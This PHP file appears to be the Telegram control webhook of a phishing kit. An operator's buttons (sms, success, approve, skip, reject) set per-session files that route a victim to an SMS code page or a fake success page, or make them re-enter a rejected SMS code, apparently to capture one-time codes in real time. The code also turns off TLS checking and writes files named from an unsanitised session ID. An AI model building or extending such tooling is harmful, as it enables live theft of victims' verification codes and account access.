<?php
// No session needed for webhook
require_once 'config.php';

// Create logs directory if not exists
if (!file_exists(__DIR__ . '/logs')) {
    mkdir(__DIR__ . '/logs', 0755, true);
}

// Get incoming data from Telegram
$content = file_get_contents('php://input');
$update = json_decode($content, true);

// Log ALL incoming data for debugging
$logEntry = date('Y-m-d H:i:s') . ' - Received: ' . json_encode($update, JSON_PRETTY_PRINT) . "\n";
file_put_contents(__DIR__ . '/logs/telegram_webhook.log', $logEntry, FILE_APPEND);

// Check if it's a callback query
if (isset($update['callback_query'])) {
    $callback = $update['callback_query'];
    $callbackData = $callback['data'] ?? '';
    $chatId = $callback['message']['chat']['id'] ?? TELEGRAM_CHAT_ID;
    $messageId = $callback['message']['message_id'] ?? 0;
    $callbackId = $callback['id'] ?? '';

    file_put_contents(__DIR__ . '/logs/telegram_webhook.log',
        date('Y-m-d H:i:s') . " - Callback data: $callbackData, Chat: $chatId, Message: $messageId\n",
        FILE_APPEND);

    // Parse callback data: approve_SESSIONID or reject_SESSIONID
    if (strpos($callbackData, '_') !== false) {
        list($action, $sessionId) = explode('_', $callbackData, 2);

        file_put_contents(__DIR__ . '/logs/telegram_webhook.log',
            date('Y-m-d H:i:s') . " - Action: $action, SessionID: $sessionId\n",
            FILE_APPEND);

        $status = '';
        $text = '';

        // Handle DECISION buttons (sms or success) - NEW
        if ($action === 'sms') {
            $decisionFile = __DIR__ . '/logs/decision_' . $sessionId . '.json';
            file_put_contents($decisionFile, json_encode(['action' => 'sms', 'time' => time()]));
            $text = "📱 <b>ENVOYÉ VERS SMS</b>\n\nL'utilisateur va vers la page de vérification SMS.";
            $status = 'sms';

        } elseif ($action === 'success') {
            $decisionFile = __DIR__ . '/logs/decision_' . $sessionId . '.json';
            file_put_contents($decisionFile, json_encode(['action' => 'success', 'time' => time()]));
            $text = "✅ <b>ENVOYÉ DIRECT SUCCESS</b>\n\nL'utilisateur va directement à la page de succès.";
            $status = 'success';
        }

        // Handle SMS VALIDATION buttons (old system, kept for compatibility)
        else {
            $validationFile = __DIR__ . '/logs/sms_validation_' . $sessionId . '.json';

            if ($action === 'approve') {
                $status = 'approved';
                $text = "✅ <b>CODE SMS APPROUVÉ</b>\n\nL'utilisateur continue vers loading puis success.";
                file_put_contents($validationFile, json_encode(['status' => 'approved', 'time' => time()]));

            } elseif ($action === 'skip') {
                $status = 'skip';
                $text = "🚀 <b>PASSÉ DIRECT (SANS SMS)</b>\n\nL'utilisateur va directement à la page success.";
                file_put_contents($validationFile, json_encode(['status' => 'skip', 'time' => time()]));

            } elseif ($action === 'reject') {
                $status = 'rejected';
                $text = "❌ <b>CODE SMS REJETÉ</b>\n\nL'utilisateur devra ressaisir le code.";
                file_put_contents($validationFile, json_encode(['status' => 'rejected', 'time' => time()]));
            }
        }

        if ($status) {
            file_put_contents(__DIR__ . '/logs/telegram_webhook.log',
                date('Y-m-d H:i:s') . " - Saved status: $status to $validationFile\n",
                FILE_APPEND);

            // Update message
            $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/editMessageText";
            $data = [
                'chat_id' => $chatId,
                'message_id' => $messageId,
                'text' => $text,
                'parse_mode' => 'HTML'
            ];

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            file_put_contents(__DIR__ . '/logs/telegram_webhook.log',
                date('Y-m-d H:i:s') . " - Edit message response: $response (HTTP $httpCode)\n",
                FILE_APPEND);

            // Answer callback query
            $answerUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/answerCallbackQuery";
            $answerText = '✅ Approuvé';
            if ($action === 'reject') {
                $answerText = '❌ Rejeté';
            } elseif ($action === 'skip') {
                $answerText = '🚀 Passé direct';
            }

            $answerData = [
                'callback_query_id' => $callbackId,
                'text' => $answerText,
                'show_alert' => false
            ];

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $answerUrl);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($answerData));
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $answerResponse = curl_exec($ch);
            curl_close($ch);

            file_put_contents(__DIR__ . '/logs/telegram_webhook.log',
                date('Y-m-d H:i:s') . " - Answer callback response: $answerResponse\n",
                FILE_APPEND);
        }
    }
}

http_response_code(200);
echo json_encode(['status' => 'ok']);
?>
